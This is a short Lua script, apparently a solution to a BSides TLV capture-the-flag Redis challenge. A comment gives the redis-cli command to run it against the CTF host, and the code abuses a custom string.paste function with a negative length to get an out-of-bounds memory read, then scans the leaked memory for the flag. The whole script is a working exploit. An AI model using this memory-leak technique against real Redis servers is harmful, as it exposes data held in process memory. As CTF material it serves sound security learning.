-- run: redis-cli --user default --pass default-pwd -h rainy-redis.ctf.bsidestlv.com --eval solve.lua 

local get_flag = function() 
    -- step 1: prep vars
    local pwnable_str = ''
 
    -- step 2: abusing memcpy to gain a long read primitive
    string.paste('AAAAAAAA', pwnable_str, 8, -8)

    -- step 3: scan leaked mem until profit ( ͡◕ _ ͡◕)👌
    local offset = string.find(pwnable_str, 'BSidesTLV')
    return string.sub(pwnable_str, offset, offset+0x100) -- leaking 0x100 bytes
end

return get_flag()